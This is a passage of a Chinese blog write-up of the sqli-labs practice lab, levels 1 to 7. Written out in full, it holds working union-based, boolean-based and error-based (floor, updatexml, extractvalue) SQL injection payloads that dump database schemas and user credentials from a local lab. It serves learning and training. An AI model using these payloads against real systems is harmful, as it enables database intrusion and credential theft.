src="https://img-blog.csdnimg.cn/d77c6b8868fc49f58289a55d540cf638.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>可以利用2，3字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">法<span class="number">1</span>：http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; union select 1,database(),3%23</span></span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Welcome    Dhakkan</span><br><span class="line">Your Login name:security 数据库名称</span><br><span class="line">Your Password:<span class="number">3</span></span><br></pre></td></tr></table></figure><p>法2：通用语句，爆数据库名</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(schema_name),3 from information_schema.schemata%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/f71474a779ee4f2a9d3ece5d4283a937.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>（2）爆表</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(table_name),3 from information_schema.tables where table_schema=database()%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/e456241396c94049b2f7503ebdf685ea.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>(3)爆字段，以其中表users为例</p><p><a href="https://blog.csdn.net/chenhualeguan/article/details/52956662?utm_source=blogxgwz0">数据库中INFORMATION_SCHEMA的说明及使用</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(column_name),3 from information_schema.columns where table_name=&#x27;</span>users<span class="string">&#x27;%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/806f61ac76d04559bb070e932094825a.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"><br>查看其中的部分数据，如username,password</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">1</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;union select 1,group_concat(username,password),3 from users%23</span></span><br></pre></td></tr></table></figure><p><img src="https://img-blog.csdnimg.cn/d006dcf3400e41a59ad78edba2dbffda.png?x-oss-process=image/watermark,type_d3F5LXplbmhlaQ,shadow_50,text_Q1NETiBAcXFfNDI3Mjg5Nzc=,size_20,color_FFFFFF,t_70,g_se,x_16" alt="在这里插入图片描述"></p><h3 id="level-2"><a href="#level-2" class="headerlink" title="level-2"></a>level-2</h3><p><strong>level-2报错型-整型 注入</strong><br>1、测试是否有简单注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;</span></span><br></pre></td></tr></table></figure><p>得到报错,存在简单注入  </p><p>2、判断字符型还是整型</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">1</span> 正常</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="number">1</span>=<span class="number">2</span> 错误</span><br></pre></td></tr></table></figure><p>说明为整型<br>3、爆字段数、数据库、表、字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=<span class="number">1</span> order by <span class="number">4</span><span class="comment">#  //爆字段数</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-27-37.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span><span class="comment">#  //查看可泄露字段</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-30-51.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,database(),<span class="number">3</span><span class="comment"># //查看当前数据库名</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-32-32.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(schema_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.schemata<span class="comment"># //查看所有数据库名</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-36-35.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(table_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.tables where table_schema=database()<span class="comment"># //查看当前数据库所有表名</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-37-55.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(column_name),<span class="number">3</span> <span class="keyword">from</span> information_schema.columns where table_name=<span class="string">&#x27;users&#x27;</span><span class="comment"># //查看当前数据库某一表的全部字段名，以users为例</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-39-53.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">2</span>/?<span class="built_in">id</span>=-<span class="number">1</span> union select <span class="number">1</span>,group_concat(username,password),<span class="number">3</span> <span class="keyword">from</span> users<span class="comment"># //查看当前数据库某一表的部分字段内容，以users为例</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-17-23-41-40.png"></p><h3 id="level-3"><a href="#level-3" class="headerlink" title="level-3"></a>level-3</h3><p><strong>level3 报错-单引号-小括号-字符型-注入</strong><br>1、是否存在简单注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; 报错，存在简单注入</span></span><br></pre></td></tr></table></figure><p>2、判断注入类型<br><img src="/2022/02/17/sqli-labs/2022-02-18-11-05-13.png"><br>对比一般的简单字符型注入，多出来一个单括号，所以推测后端代码 为 <code> WHERE id=(&#39;$id&#39;) LIMIT 0,1&quot;;</code><br>所以注入类型为<strong>报错-单引号-小括号-字符型-sql注入</strong>，接下来构造语句时只需要保证单引号、括号闭合即可</p><p>4、爆字段数、数据库等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27;)order by 4 %23  //爆字段数</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-13-47.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) union select 1,2,3 %23 //包显性字段 </span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-15-19.png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">3</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27;) union select 1,database(),3 %23 //爆数据库</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-16-09.png"><br>接下来同level1\2，不展示了</p><h3 id="level-4"><a href="#level-4" class="headerlink" title="level-4"></a>level-4</h3><p><strong>报错-双引号-小括号-字符型-sql注入</strong>  </p><p>1、测判断否存在简单注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; //正常，排除单引号报错</span></span><br><span class="line"><span class="string">http://127.0.0.1/sqli-labs/Less-4/?id=1&quot; //报错</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-11-27-15.png"><br>看到双引号，判断为<strong>报错-双引号-小括号-字符型-sql注入</strong>，推测后端查询语句为<br><code>where id = (&quot;$id&quot;) LIMIT 0,1; </code><br>2、爆字段数</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&quot;) order by 4%23 //保证闭合即可</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-12-13-25.png"><br>3、爆显性字段   </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;) union select 1,2,3 %23</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-12-14-22.png"><br>4、爆数据库、表名、字段等</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">4</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&quot;) union select 1,database(),3 %23 //爆数据库名</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-12-17-52.png"><br>后面和level1\2\3一样，不展示了</p><h3 id="level-5"><a href="#level-5" class="headerlink" title="level-5"></a>level-5</h3><p><strong>报错回显&#x2F;布尔-字符型-注入</strong><br>1、布尔注入<br>回显只有正确和无，但是判断确实存在注入的情况。<br>设计语句返回true&#x2F;false 一点点爆破数据。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; or 1=1%23  成功通过，存在布尔注入</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-18-23-08-21.png">  </p><p>布尔注入常用函数及语句:<a href="#refer-anchor-1"><sup>1</sup></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">length(<span class="built_in">str</span>)：返回<span class="built_in">str</span>字符串的长度。</span><br><span class="line">substr(<span class="built_in">str</span>, pos, <span class="built_in">len</span>)：将<span class="built_in">str</span>从pos位置开始截取<span class="built_in">len</span>长度的字符进 行返回。注意这里的pos位置是从<span class="number">1</span>开始的，不是数组的<span class="number">0</span>开始</span><br><span class="line">mid(<span class="built_in">str</span>,pos,<span class="built_in">len</span>):跟上面的一样，截取字符串</span><br><span class="line"><span class="built_in">ascii</span>(<span class="built_in">str</span>)：返回字符串<span class="built_in">str</span>的最左面字符的ASCII代码值。</span><br><span class="line"><span class="built_in">ord</span>(<span class="built_in">str</span>):同上，返回<span class="built_in">ascii</span>码</span><br><span class="line"><span class="keyword">if</span>(a,b,c) :a为条件，a为true，返回b，否则返回c，如<span class="keyword">if</span>(<span class="number">1</span>&gt;<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>),返回<span class="number">0</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>布尔注入常用语句：<a href="#refer-anchor-1"><sup>1</sup></a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1.</span>判断数据库长度 </span><br><span class="line"><span class="string">&#x27; or Length(database()) = 8 #返回true说明数据库长度为8</span></span><br><span class="line"><span class="string">2.获取数据库名字</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> <span class="built_in">ord</span>(mid(database(),<span class="number">1</span>,<span class="number">1</span>)) =<span class="string">&#x27;ascill值&#x27;</span><span class="comment">#</span></span><br><span class="line">依次获取</span><br><span class="line"><span class="number">3.</span>获取表的总数</span><br><span class="line"><span class="string">&#x27; or (select count(TABLE_NAME) from information_schema.TABLES where TABLE_SCHEMA=database() )= 2#</span></span><br><span class="line"><span class="string">4.获取表的长度(第一个表)</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span> (select length(TABLE_NAME) <span class="keyword">from</span> information_schema.TABLES where TABLE_SCHEMA=database() limit <span class="number">0</span>,<span class="number">1</span> )= (猜测得长度)<span class="comment">#</span></span><br><span class="line"><span class="number">5.</span>获取表的内容</span><br><span class="line"><span class="string">&#x27; or  mid((select TABLE_NAME from information_schema.TABLES where </span></span><br><span class="line"><span class="string">TABLE_SCHEMA=database() limit 0,1),1,1)   = &#x27;</span>a<span class="string">&#x27; #</span></span><br><span class="line"><span class="string">6.获取表的字段的总数</span></span><br><span class="line"><span class="string">&#x27;</span> <span class="keyword">or</span>  (select count(COLUMN_NAME) <span class="keyword">from</span> information_schema.COLUMNS where TABLE_NAME=表名 ) = <span class="number">8</span><span class="comment">#8返回true说明有8个表</span></span><br><span class="line">依次类推,最后推出内容</span><br></pre></td></tr></table></figure><p>写了一些脚本，顺便学习了python多线程。<br>2、报错注入<a href="#refer-anchor-2"><sup>2</sup></a><br>(1). floor报错注入,由于floor\count\group by 这三个函数导致，<strong>原理</strong><a href="#refer-anchor-3"><sup>3</sup></a>  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> (select <span class="number">1</span> <span class="keyword">from</span> (select count(*),concat((payload),floor (rand(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables group by x)a)</span><br><span class="line">```  </span><br><span class="line">示例：</span><br><span class="line">爆数据库</span><br><span class="line">```python</span><br><span class="line">//payload为select database() limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">// <span class="number">0x7e</span> 是~,方便脚本抓取数据</span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select database() limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>爆表,可以根据设置是否需要 limit，这里只能显示一行，所以要用一下</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload : select table_name <span class="keyword">from</span> information_schema.tables where table_schema =database() limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select table_name from information_schema.tables where table_schema =database() limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload : select column_name <span class="keyword">from</span> information_schema.columnss where table_name =<span class="string">&#x27;users&#x27;</span> limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select column_name from information_schema.columnss where table_name =&#x27;</span>users<span class="string">&#x27; limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>报数据</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">//payload : select concat(username,<span class="string">&#x27;:&#x27;</span>,password) <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">5</span>/?<span class="built_in">id</span>=-<span class="number">1</span><span class="string">&#x27; and (select 1 from (select count(*),concat(0x7e,(select concat(username,&#x27;</span>:<span class="string">&#x27;,password) from users limit 0,1),0x7e,floor (rand(0)*2))x from information_schema.tables group by x)a)%23</span></span><br></pre></td></tr></table></figure><p>其中payload为你要插入的SQL语句<br>需要注意的是该语句将,输出字符长度限制为64个字符</p><p>(2). updatexml报错注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> updatexml(<span class="number">1</span>,payload,<span class="number">1</span>)</span><br></pre></td></tr></table></figure><p>输出字符长度限制为32个字符,只有在payload返回的不是xml格式才会生效</p><p>(3). ExtractValue报错注入</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">and</span> extractvalue(<span class="number">1</span>, payload)</span><br></pre></td></tr></table></figure><p>输出字符长度限制为32个字符</p><p>这里后两种方法没反应，待补</p><p>参考：  </p><div id="refer-anchor-1"></div><ul><li><p>[1] <a href="https://segmentfault.com/a/1190000021795049">SQL注入之布尔注入原理</a></p><div id="refer-anchor-2"></div></li><li><p>[2] <a href="https://www.cnblogs.com/-qing-/p/11610385.html#_label2">报错注入lv5</a></p><div id="refer-anchor-3"></div></li><li><p>[3] <a href="https://qwzf.github.io/2019/09/25/SQL%E6%B3%A8%E5%85%A5-%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/">SQL注入-报错注入</a></p></li><li><p>[3-1] <a href="https://www.cnblogs.com/c1047509362/p/12806297.html">SQL注入实战之报错注入篇</a></p></li></ul><h3 id="level-6"><a href="#level-6" class="headerlink" title="level-6"></a>level-6</h3><p><strong>布尔&#x2F;报错-双引号-注入</strong><br>改了一下后台显示，方便学习<br>1、测试注入  </p><p>无修饰，id&#x3D;1<br><img src="/2022/02/17/sqli-labs/2022-02-19-16-16-15.png"><br>加单引号，id&#x3D;1’</p><p><img src="/2022/02/17/sqli-labs/2022-02-19-16-23-49.png"><br>对比发现竟然没有报错！</p><p>加双引号，id&#x3D;1”<br><img src="/2022/02/17/sqli-labs/2022-02-19-16-25-52.png"><br>这里可以直观的看到报错原因，以及sql语句和报错信息之间的关系<br>判断为<strong>不显示查询结果的-波尔&#x2F;报错-双引号-注入</strong><br>所以和level-5一样，这里仅爆数据库，剩余不具体展示  </p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://<span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span>/sqli-labs/Less-<span class="number">6</span>/?<span class="built_in">id</span>=<span class="number">1</span><span class="string">&quot;  and updatexml(1,concat(0x7e,(database()),0x7e),1)%23</span></span><br></pre></td></tr></table></figure><p><img src="/2022/02/17/sqli-labs/2022-02-19-16-34-09.png"></p><p>这里就可以做个总结了<br>我们看一下level 1~6 报错和sql语句的联系</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">level-<span class="number">1</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    changed id : 1&#x27;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">level-<span class="number">2</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    changed id : 1&#x27;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=<span class="number">1</span><span class="string">&#x27; LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27; LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">level-<span class="number">3</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    changed id : 1&#x27;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=(<span class="string">&#x27;1&#x27;</span><span class="string">&#x27;) LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&#x27;1&#x27;</span><span class="string">&#x27;) LIMIT 0,1&#x27;</span> at line <span class="number">1</span></span><br><span class="line"></span><br><span class="line">level-<span class="number">4</span></span><br><span class="line">    raw <span class="built_in">id</span>: <span class="number">1</span><span class="string">&quot;</span></span><br><span class="line"><span class="string">    changed id : &quot;</span><span class="number">1</span><span class="string">&quot;&quot;</span></span><br><span class="line">    SELECT * FROM users WHERE <span class="built_in">id</span>=(<span class="string">&quot;1&quot;</span><span class="string">&quot;) LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;&quot;</span><span class="number">1</span><span class="string">&quot;&quot;</span>) LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line 1</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">level-5</span></span><br><span class="line"><span class="string">    raw id: 1&#x27;</span></span><br><span class="line">    changed <span class="built_in">id</span> : <span class="number">1</span><span class="string">&#x27;</span></span><br><span class="line"><span class="string">    SELECT * FROM users WHERE id=&#x27;</span><span class="number">1</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span></span><br><span class="line">    You have an error <span class="keyword">in</span> your SQL syntax; check the manual that corresponds to your MySQL server version <span class="keyword">for</span> the right syntax to use near <span class="string">&#x27;&#x27;</span><span class="number">1</span><span class="string">&#x27;&#x27;</span> LIMIT <span class="number">0</span>,<span class="number">1</span><span class="string">&#x27; at line </span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">level-6</span></span><br><span class="line"><span class="string">    raw id: 1&quot;</span></span><br><span class="line"><span class="string">    changed id : &quot;1&quot;&quot;</span></span><br><span class="line"><span class="string">    SELECT * FROM users WHERE id=&quot;1&quot;&quot; LIMIT 0,1</span></span><br><span class="line"><span class="string">    You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#x27;</span><span class="string">&quot;1&quot;</span><span class="string">&quot; LIMIT 0,1&#x27; at line 1</span></span><br></pre></td></tr></table></figure><p>我们记输入id值为raw_id,本后端加工过后的id为changed_id,后端加工函数为change()，报错sql段为sql_error<br>以sqli-labs为例，他们的关系基本是</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sql_error=<span class="string">&#x27;changed_id LIMIT 0，1&#x27;</span>= <span class="string">&#x27;chaged(id) LIMIT 0,1&#x27;</span></span><br></pre></td></tr></table></figure><p>我们从此可以推断sql语句的id部分。</p><h3 id="level-7"><a href="#level-7" class="headerlink" title="level-7"></a>level-7</h3><p><strong>布尔-双括号-单引号-注入</strong><br>没有回显，只有对或错，尝试，无解，上sqlmap，sqlmap真强大！<br><img src="/2022/02/17/sqli-labs/2022-02-19-17-38-55.png"><br>看看后台</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span 